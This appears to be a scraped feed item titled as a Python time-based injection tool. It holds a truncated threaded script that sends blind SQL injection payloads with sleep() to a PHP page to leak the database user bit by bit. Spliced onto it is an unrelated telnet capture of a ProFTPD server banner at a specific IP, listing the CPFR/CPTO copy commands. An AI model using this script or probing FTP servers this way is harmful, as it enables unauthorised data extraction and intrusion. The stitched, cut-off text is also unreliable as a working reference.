item.title: python延迟注入
item.description: #!/usr/bin/env python # -*- coding: utf-8 -*- # 延迟注入工具 import urllib2 import time import socket import threading import requests class my_threading(threading.Thread): def __init__(self, str,x): threading.Thread.__init__(self) self.str = str self.x = x def run(self): global res x=self.x j = self.str url = "http://localhost/demo/1.php?username=root'+and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29," + str(x) + ",1%29%29%29,8,0%29,"+ str(j) + ",1%29%29,sleep%282%29,0%29%23" html = request(url) verify = 'timeout' if verify not in html: res[str(j)] = 0 #print 1

Connected to 80.150.216.115. Escape character is '^]'. 220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115] site help 214-The following SITE commands are recognized (* =>'s unimplemented) 214-CPFR <sp> pathname 214-CPTO <sp> pathname 214-UTIME <sp> YYYYMMDDhhmm[ss]
